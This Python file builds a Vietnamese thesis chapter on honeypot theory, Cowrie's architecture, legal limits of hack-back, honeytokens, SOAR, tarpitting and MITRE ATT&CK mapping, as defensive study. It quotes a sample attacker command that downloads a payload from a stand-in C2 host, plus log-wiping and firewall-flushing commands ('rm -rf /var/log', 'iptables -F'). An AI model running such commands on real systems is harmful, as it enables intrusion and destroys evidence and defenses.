"""
Chapter 2: CƠ SỞ LÝ THUYẾT VÀ KHUNG CÔNG NGHỆ (8-10 trang)
Trình bày sâu sắc về lý thuyết Honeypot, phân loại, kiến trúc Cowrie, phân tích pháp lý về Hack-back vs Active Defense,
kỹ thuật Honeytokens khử ẩn danh, khung SOAR, cơ chế Tarpitting và ma trận MITRE ATT&CK.
"""

from docx.shared import Pt


def build_chapter2(doc, helpers):
    add_custom_heading = helpers["add_custom_heading"]
    add_body_paragraph = helpers["add_body_paragraph"]
    add_callout_box = helpers["add_callout_box"]
    add_styled_table = helpers["add_styled_table"]

    add_custom_heading(doc, "CHƯƠNG 2: CƠ SỞ LÝ THUYẾT VÀ KHUNG CÔNG NGHỆ", level=1)

    # 2.1
    add_custom_heading(doc, "2.1 Bản chất và Phân loại Công nghệ Bẫy Honeypot", level=2)
    add_body_paragraph(doc, "Thuật ngữ Honeypot (Bình mật) được giới thiệu lần đầu tiên trong lĩnh vực an toàn thông tin bởi Clifford Stoll trong cuốn tiểu thuyết kinh điển 'The Cuckoo's Egg' (1989) và sau đó được Lance Spitzner chính thức định nghĩa một cách khoa học: 'Honeypot là một tài nguyên an ninh thông tin mà giá trị cốt lõi của nó nằm ở chỗ nó bị thăm dò, bị tấn công hoặc bị xâm phạm trái phép'. Bản chất của Honeypot là một hệ thống không phục vụ bất kỳ mục đích sản xuất hay kinh doanh hợp pháp nào. Do đó, bất kỳ nỗ lực kết nối, rà quét hay tương tác nào hướng tới Honeypot đều được coi là hành vi bất thường hoặc có ý đồ xấu.")
    add_body_paragraph(doc, "Dựa trên mức độ tương tác (Level of Interaction) cho phép kẻ tấn công thực hiện, công nghệ Honeypot được phân chia thành ba nhóm chính:")
    add_body_paragraph(doc, "1. Honeypot tương tác thấp (Low-Interaction Honeypots): Hệ thống chỉ mô phỏng các tầng giao thức mạng cơ bản (chẳng hạn như bắt tay TCP SYN-ACK hoặc trả lời các banner dịch vụ tĩnh). Hệ thống không có hệ điều hành thật hay shell dòng lệnh nào được thực thi. Điển hình cho dòng này là Honeyd. Ưu điểm là tiêu tốn cực ít tài nguyên phần cứng, an toàn tuyệt đối vì hacker không thể lợi dụng để phá hoại, nhưng nhược điểm là không thu thập được kịch bản tấn công phức tạp và rất dễ bị các công cụ quét chuyên nghiệp phát hiện (Fingerprinted).")
    add_body_paragraph(doc, "2. Honeypot tương tác trung bình (Medium-Interaction Honeypots): Hệ thống mô phỏng một môi trường ứng dụng và hệ thống tệp tin giả lập đầy đủ hơn. Hệ thống có khả năng tương tác với kẻ tấn công thông qua các phiên bản giả lập của shell (như bash), cung cấp khả năng bắt giữ các tệp tin tải lên (payload downloading) và mô phỏng thành công các lỗ hổng dịch vụ phổ biến mà không cần chạy một hệ điều hành thực tế bên dưới. Cowrie và Dionaea là hai đại diện tiêu biểu nhất. Đây là giải pháp cân bằng hoàn hảo giữa độ an toàn và độ phong phú của dữ liệu thu thập được.")
    add_body_paragraph(doc, "3. Honeypot tương tác cao (High-Interaction Honeypots): Hệ thống sử dụng máy ảo (Virtual Machine) hoặc máy chủ vật lý thực sự chạy hệ điều hành hoàn chỉnh (Real OS) và các dịch vụ thực tế để kẻ tấn công xâm nhập. Mọi hành vi của hacker đều được giám sát chặt chẽ từ bên ngoài thông qua hypervisor hoặc kernel hook. Nhược điểm lớn nhất là rủi ro an ninh rất cao: nếu cấu hình cô lập mạng không cẩn thận, kẻ tấn công có thể biến máy bẫy thành bàn đạp tấn công ngược lại toàn bộ hệ thống nội bộ của doanh nghiệp.")

    honeypot_comp_headers = ["Dòng Honeypot", "Mức độ Tương tác", "Dịch vụ Mô phỏng Chính", "Ưu điểm Vượt trội", "Hạn chế Chính"]
    honeypot_comp_data = [
        ["Dionaea", "Medium-Interaction", "SMB, HTTP, FTP, TFTP, MSSQL", "Chuyên bắt giữ sâu mạng (Worms) và mã độc tự lây qua SMB.", "Không hỗ trợ tương tác dòng lệnh SSH chuyên sâu."],
        ["Cowrie", "Medium-Interaction", "SSH, Telnet, SFTP", "Giả lập shell Linux chân thực, ghi log TTY chi tiết, lưu giữ mã độc.", "Cần tinh chỉnh để tránh bị hacker phát hiện chữ ký mặc định."],
        ["Conpot", "Low-Medium", "ICS/SCADA, Modbus, S7Comm, BACnet", "Thu thập thông tin tấn công vào hạ tầng điều khiển công nghiệp.", "Chỉ phù hợp với hệ thống công nghiệp đặc thù."],
        ["Glastopf", "Low-Medium", "Web Application, HTTP, Vulnerability emu", "Bắt các đợt quét lỗ hổng SQL Injection, LFI/RFI trên web.", "Đã ngừng phát triển tích cực, được thay thế bởi Snare/Tanner."],
        ["Honeyd", "Low-Interaction", "TCP/IP Stack, IP Daemons", "Mô phỏng hàng ngàn máy chủ ảo trên một địa chỉ IP duy nhất.", "Không hỗ trợ tương tác ứng dụng thực tế."],
    ]
    add_styled_table(doc, honeypot_comp_headers, honeypot_comp_data, caption="Bảng 2.1: Ma trận so sánh các dòng Honeypot mã nguồn mở phổ biến trên thế giới")

    # 2.2
    add_custom_heading(doc, "2.2 Kiến trúc và Cơ chế hoạt động của Cowrie SSH/Telnet Honeypot", level=2)
    add_body_paragraph(doc, "Cowrie là một hệ thống Medium-to-High Interaction Honeypot chuyên biệt cho việc giám sát giao thức SSH và Telnet, được phát triển dựa trên nền tảng framework Twisted của ngôn ngữ Python. Cowrie vốn được fork và nâng cấp toàn diện từ dự án Kippo nổi tiếng, bổ sung thêm hàng loạt tính năng hiện đại như hỗ trợ giao thức Telnet, giả lập SFTP, xuất log JSON thời gian thực và kiến trúc Proxy chuyển tiếp linh hoạt.")
    add_body_paragraph(doc, "Cơ chế hoạt động bên trong của Cowrie bao gồm các thành phần cốt lõi sau:")
    add_body_paragraph(doc, "1. Twisted Event-Driven Engine: Toàn bộ quá trình bắt tay SSH, trao đổi khóa mã hóa (Key Exchange), thương lượng thuật toán mã hóa đối xứng (Cipher Negotiation) và xác thực người dùng đều được xử lý bất đồng bộ bởi Twisted. Điều này cho phép Cowrie có thể duy trì hàng ngàn kết nối đồng thời từ các botnet mà không làm sụp đổ bộ nhớ hệ thống.")
    add_body_paragraph(doc, "2. Hệ thống Tệp tin Giả lập (Virtual Filesystem - fs.pickle): Thay vì để kẻ tấn công can thiệp vào ổ cứng thật của máy chủ, Cowrie sử dụng một tệp tin serialized (fs.pickle) đại diện cho cây thư mục hệ điều hành Linux Debian tiêu chuẩn (bao gồm /bin, /etc, /var, /root, /home). Khi hacker thực hiện các lệnh duyệt thư mục như ls, cd, cat, Cowrie sẽ đọc thông tin từ cấu trúc ảo này. Bất kỳ thao tác xóa file hay thay đổi quyền hạn đều chỉ tồn tại tạm thời trong bộ nhớ của phiên làm việc đó, hoàn toàn không ảnh hưởng đến hệ thống máy chủ vật lý.")
    add_body_paragraph(doc, "3. Shell Emulation Engine: Cowrie tích hợp một bộ xử lý lệnh mô phỏng cho hơn 50 lệnh Linux phổ biến nhất (cat, whoami, uname, ifconfig, ps, kill, wget, curl, crontab). Khi kẻ tấn công nhập lệnh, Cowrie sẽ phân tích cú pháp (parse arguments) và trả về kết quả giả lập giống hệt như trên máy chủ thật.")
    add_body_paragraph(doc, "4. Malware Staging & Payload Capture: Đây là tính năng đắt giá nhất của Cowrie. Khi kẻ tấn công thực thi lệnh tải mã độc từ xa (ví dụ: 'wget http://malicious-c2.org/arm7 -O bot.sh'), Cowrie không dùng tiến trình wget thật mà tự động sử dụng thư viện HTTP client nội bộ để âm thầm tải file nhị phân đó về thư mục cách ly 'var/lib/cowrie/downloads', tính toán mã băm SHA256 và lưu lại dấu vết phiên làm việc.")
    add_body_paragraph(doc, "5. TTY Recording & Structured JSON Logging: Mọi thao tác gõ phím của kẻ tấn công đều được ghi lại dưới định dạng TTY log (cho phép xem lại như một đoạn video tua lại bằng lệnh 'bin/playlog') và toàn bộ metadata sự kiện được xuất ra tệp tin cấu trúc 'cowrie.json' thời gian thực.")

    # 2.3
    add_custom_heading(doc, "2.3 Phân tích Pháp lý và Kỹ thuật về 'Tấn công ngược' (Hack-back vs. Active Defense)", level=2)
    add_body_paragraph(doc, "Trong các cuộc thảo luận kỹ thuật an ninh mạng, cụm từ 'Tấn công ngược kẻ tấn công' (Counter-attack hoặc Hack-back) thường xuyên được nhắc đến như một khát vọng phản kháng của đội ngũ phòng thủ (Blue Team). Tuy nhiên, trên cả phương diện kỹ thuật thực tế và khung pháp lý quốc tế lẫn Việt Nam, việc thực hiện 'Hack-back' mù quáng tiềm ẩn những rủi ro pháp lý và kỹ thuật đặc biệt nghiêm trọng:")
    add_body_paragraph(doc, "• Bài toán Phân định Mục tiêu (Attribution Problem): Trong không gian mạng, các tin tặc chuyên nghiệp và các mạng botnet hiếm khi tấn công trực tiếp từ máy tính cá nhân của chúng. Chúng luôn giấu mình sau nhiều lớp Proxy ẩn danh, mạng Tor, máy chủ VPN thương mại, hoặc nguy hiểm hơn là thông qua hàng triệu thiết bị IoT (Router, Camera) của các nạn nhân vô tội bị chiếm quyền điều khiển. Nếu Blue Team thực hiện 'tấn công ngược' (như phát động DoS hay khai thác lỗ hổng) vào địa chỉ IP nguồn, chúng ta sẽ trực tiếp xâm phạm và phá hoại hệ thống của bên thứ ba vô tội, biến chính mình từ nạn nhân thành tội phạm công nghệ cao.")
    add_body_paragraph(doc, "• Khung Pháp lý Hiện hành: Điều 287 và Điều 289 Bộ luật Hình sự Việt Nam năm 2015 (sửa đổi, bổ sung 2017), Luật An ninh mạng Việt Nam 2018, cũng như Đạo luật Lạm dụng và Gian lận Máy tính của Hoa Kỳ (CFAA) đều nghiêm cấm mọi hành vi truy cập bất hợp pháp, phá hoại hoặc làm gián đoạn hoạt động của mạng máy tính mà không có thẩm quyền hợp pháp, bất kể mục đích của hành vi đó là để 'tự vệ' hay 'phản đòn'.")
    add_body_paragraph(doc, "Chính vì lý do đó, các tổ chức an ninh mạng hàng đầu thế giới đã định nghĩa lại khái niệm phản đòn thành: **Phòng thủ Chủ động (Active Defense & Active Deception)** theo chuẩn khung chiến lược **MITRE Engage (trước đây là MITRE Shield)** và **MITRE D3FEND**. Phòng thủ chủ động là nghệ thuật tác chiến hợp pháp và an toàn tuyệt đối, tập trung vào việc:")
    add_body_paragraph(doc, "1. Nhử đối phương vào các tài nguyên giả định (Decoy & Lures).")
    add_body_paragraph(doc, "2. Đánh lừa và cung cấp thông tin sai lệch để đối phương tiêu hao nguồn lực vô ích (Tarpitting).")
    add_body_paragraph(doc, "3. Trinh sát ngược nguồn mở (Reverse OSINT) để nhận diện hạ tầng của đối phương mà không vi phạm pháp luật.")
    add_body_paragraph(doc, "4. Gài bẫy mồi nhử (Honeytokens) để khi kẻ tấn công mang chiến lợi phẩm về mở trên máy thật của chúng, hệ thống sẽ bắt được vị trí và danh tính thực sự của đối thủ (De-anonymization).")

    legal_comp_headers = ["Tiêu chí So sánh", "Tấn công ngược (Hack-Back / Strike Back)", "Phòng thủ Chủ động (Active Defense / MITRE Engage)"]
    legal_comp_data = [
        ["Tính Hợp pháp", "Trái pháp luật (Vi phạm Điều 287 BLHS, Luật ANM 2018).", "Hoàn toàn Hợp pháp (Tuân thủ quyền tự bảo vệ hệ thống nội bộ)."],
        ["Đối tượng Tác động", "Tác động trực tiếp vào máy chủ của IP tấn công (Dễ trúng máy vô tội).", "Tác động trong phạm vi tài nguyên và hệ thống bẫy do ta sở hữu."],
        ["Mục tiêu Tác chiến", "Cố gắng phá hủy, xâm nhập hoặc DoS máy đối phương.", "Thu thập tình báo (OSINT), làm kiệt quệ tài nguyên, lật tẩy danh tính thật."],
        ["Độ rủi ro Hệ thống", "Rất cao (Bị kiện tụng pháp lý, bị trả đũa quy mô lớn hơn).", "Rất thấp (Được bảo vệ trong môi trường Sandbox và Deception)."],
        ["Độ tin cậy Định danh", "Kém (Thường chỉ đánh trúng Proxy hoặc Botnet Zombie).", "Rất cao (Lật tẩy IP thật khi hacker mở Honeytoken trên máy cá nhân)."],
    ]
    add_styled_table(doc, legal_comp_headers, legal_comp_data, caption="Bảng 2.2: So sánh toàn diện giữa Tấn công ngược bất hợp pháp và Phòng thủ chủ động hợp pháp")

    # 2.4
    add_custom_heading(doc, "2.4 Chiến lược Đánh lừa Chủ động (Active Deception) và Kỹ thuật Honeytoken / Canary Tokens", level=2)
    add_body_paragraph(doc, "Kỹ thuật Honeytoken (hoặc Canary Token) là một trong những vũ khí phòng thủ chủ động tinh vi nhất của an ninh mạng hiện đại. Một Honeytoken là một mẩu dữ liệu giả mạo (Fake Credential, API Key, Database Dump, File tài liệu nội bộ) được cố tình gài cắm ở những vị trí mà chỉ có kẻ xâm nhập trái phép mới tìm thấy và tò mò tiếp cận.")
    add_body_paragraph(doc, "Cơ chế Khử ẩn danh Kẻ tấn công (Adversarial De-anonymization) hoạt động dựa trên tâm lý học của tin tặc:")
    add_body_paragraph(doc, "Bước 1 - Gài bẫy (Luring): Bên trong hệ thống tệp tin của Cowrie, ta tạo ra các tệp tin có vẻ vô cùng giá trị, ví dụ: '/root/.aws/credentials', '/root/.bash_history' hoặc '/var/backups/db_dump_passwords.txt'.")
    add_body_paragraph(doc, "Bước 2 - Đánh cắp (Exfiltration): Khi kẻ tấn công xâm nhập thành công vào Honeypot qua SSH, đối phương sẽ sử dụng lệnh 'cat' hoặc dùng SFTP để tải các tệp tin này về máy của chúng.")
    add_body_paragraph(doc, "Bước 3 - Thử nghiệm (Weaponization & Trigger): Kẻ tấn công muốn sử dụng tài khoản AWS hoặc mật khẩu vừa đánh cắp. Để làm điều đó, chúng sẽ mở tài liệu trên trình duyệt hoặc chạy lệnh curl xác thực tài khoản. Tuy nhiên, các thông tin trong file bẫy đều được nhúng sẵn một mã định danh theo dõi (Canary Webhook Beacon).")
    add_body_paragraph(doc, "Bước 4 - Lật tẩy Danh tính Thật (De-cloaking): Khi kẻ tấn công kích hoạt đường link trên máy cá nhân của chúng (nơi chúng không bật proxy hoặc đã ngắt kết nối SSH bẫy), gói tin HTTP request sẽ gửi thẳng về Webhook Server của ta. Lúc này, hệ thống sẽ ghi nhận được: Địa chỉ IP thực của hacker, Nhà mạng Internet thực tế (ISP), Thông số User-Agent trình duyệt và Hệ điều hành máy thật của hacker.")

    # 2.5
    add_custom_heading(doc, "2.5 Khung Tự động hóa và Điều phối Phản ứng Sự cố An ninh (SOAR)", level=2)
    add_body_paragraph(doc, "Khái niệm SOAR (Security Orchestration, Automation, and Response) được hãng nghiên cứu Gartner định hình vào năm 2017, đại diện cho thế hệ công nghệ quản trị an ninh mạng hợp nhất ba năng lực cốt lõi: Quản lý mối đe dọa và lỗ hổng (Threat & Vulnerability Management), Tự động hóa vận hành an ninh (Security Operations Automation) và Điều phối phản ứng sự cố (Incident Response Orchestration).")
    add_body_paragraph(doc, "Trong một trung tâm điều hành SOC tiêu chuẩn, thời gian trung bình để phản ứng (Mean Time to Respond - MTTR) là thước đo sống còn đối với sự an toàn của doanh nghiệp. Nếu không có SOAR, một chu trình phản ứng bao gồm 4 bước tách rời:")
    add_body_paragraph(doc, "1. Phát hiện: Chuyên viên nhìn thấy log cảnh báo.")
    add_body_paragraph(doc, "2. Xác minh: Chuyên viên copy IP lên AbuseIPDB, VirusTotal để kiểm tra danh tiếng.")
    add_body_paragraph(doc, "3. Quyết định: Đánh giá xem IP có phải là IP quét nguy hại không.")
    add_body_paragraph(doc, "4. Khắc phục: SSH vào Firewall để gõ lệnh chặn IP.")
    add_body_paragraph(doc, "Quy trình thủ công này thường mất 15-20 phút và dễ mắc lỗi do con người. Với SOAR, toàn bộ quy trình này được mã hóa thành các kịch bản thực thi tự động (Automated Playbooks). Khi có sự kiện đạt ngưỡng vi phạm, Playbook sẽ tự động chạy trong vài trăm mili-giây, thực hiện trinh sát, cập nhật bảng luật tường lửa và gửi thông báo tổng hợp tới thiết bị của chuyên viên, giảm MTTR xuống mức gần bằng 0.")

    # 2.6
    add_custom_heading(doc, "2.6 Kỹ thuật Giam lỏng và Tiêu hao Tài nguyên Kẻ tấn công (Connection Tarpitting)", level=2)
    add_body_paragraph(doc, "Tarpit (Hố nhựa đường) là một kỹ thuật mạng phòng thủ chủ động cực kỳ độc đáo và hiệu quả cao trong việc đối phó với các đợt tấn công từ điển tự động. Khác với cơ chế Tường lửa truyền thống (lập tức gửi cờ TCP RST hoặc âm thầm DROP gói tin), Tarpit chọn cách: Chấp nhận kết nối TCP của kẻ tấn công nhưng cố tình phản hồi dữ liệu với tốc độ chậm nhất có thể (chẳng hạn như gửi từng ký tự banner SSH cách nhau 10 đến 15 giây).")
    add_body_paragraph(doc, "Tác động tiêu hao đối với Kẻ tấn công:")
    add_body_paragraph(doc, "Các công cụ tấn công brute-force tự động (như Hydra, Medusa, hay các botnet script) hoạt động dựa trên cơ chế đa luồng (Multi-threading). Mỗi luồng sẽ mở một socket TCP tới máy chủ mục tiêu và chờ đợi phản hồi để thử tiếp mật khẩu khác. Khi bị chuyển hướng vào Tarpit:")
    add_body_paragraph(doc, "• Socket của kẻ tấn công bị 'treo' vô thời hạn, không bị ngắt kết nối nhưng cũng không thể gửi tiếp yêu cầu mới.")
    add_body_paragraph(doc, "• Bảng tài nguyên kết nối (File Descriptors / Socket Pool) trên máy tấn công bị lấp đầy và cạn kiệt.")
    add_body_paragraph(doc, "• Cuộc tấn công bị tê liệt hoàn toàn mà kẻ tấn công không hề nhận được bất kỳ tín hiệu lỗi nào để khởi động lại tiến trình.")

    # 2.7
    add_custom_heading(doc, "2.7 Khung ma trận TTPs chuẩn MITRE ATT&CK trong Phân tích Hành vi Tấn công", level=2)
    add_body_paragraph(doc, "MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) là một cơ sở tri thức toàn cầu chuẩn hóa hành vi của các tác nhân đe dọa dựa trên các quan sát thực tế trong thế giới thực. Việc áp dụng MITRE ATT&CK vào hệ thống Honeypot cho phép chuẩn hóa các sự kiện kỹ thuật thô thành các kỹ thuật tác chiến có ý nghĩa.")
    add_body_paragraph(doc, "Trong đồ án này, các kỹ thuật cốt lõi sau được nhận diện và ánh xạ tự động:")
    add_body_paragraph(doc, "• T1110 (Brute Force) / T1110.001 (Password Guessing): Hành vi thử liên tiếp nhiều cặp mật khẩu vào tài khoản root/admin.")
    add_body_paragraph(doc, "• T1078 (Valid Accounts): Hành vi đăng nhập thành công vào Honeypot bằng tài khoản mặc định hoặc đoán trúng.")
    add_body_paragraph(doc, "• T1082 (System Information Discovery): Các lệnh thu thập thông tin hệ thống do hacker thực thi ngay sau khi đăng nhập (uname -a, cat /etc/issue, cat /proc/cpuinfo).")
    add_body_paragraph(doc, "• T1059 (Command and Scripting Interpreter): Hành vi thực thi các câu lệnh bash, python, sh bên trong terminal ảo.")
    add_body_paragraph(doc, "• T1105 (Ingress Tool Transfer): Kỹ thuật tải công cụ và mã độc từ máy chủ C2 về máy bẫy thông qua wget hoặc curl.")
    add_body_paragraph(doc, "• T1552.001 (Credentials In Files): Kỹ thuật tìm kiếm và đọc các tệp tin chứa thông tin nhạy cảm (.aws/credentials, id_rsa, db_dump).")
    add_body_paragraph(doc, "• T1562.001 (Impair Defenses - Disable or Modify Tools): Hành vi gõ lệnh nhằm tắt tường lửa hoặc xóa lịch sử log (iptables -F, rm -rf /var/log).")

    doc.add_page_break()
